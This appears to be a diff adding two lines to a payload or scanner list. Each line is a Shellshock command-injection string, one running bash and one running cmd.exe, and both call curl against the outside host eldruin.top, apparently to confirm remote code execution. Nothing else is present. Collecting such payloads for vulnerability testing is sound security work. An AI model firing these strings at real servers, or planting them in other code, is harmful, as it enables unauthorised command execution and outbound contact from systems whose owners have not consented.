@@ -1,0 +1,2 @@
+() { :;}; /bin/bash -c 'curl eldruin.top'
+() { :;}; c:\windows\system32\cmd.exe -c 'curl eldruin.top'
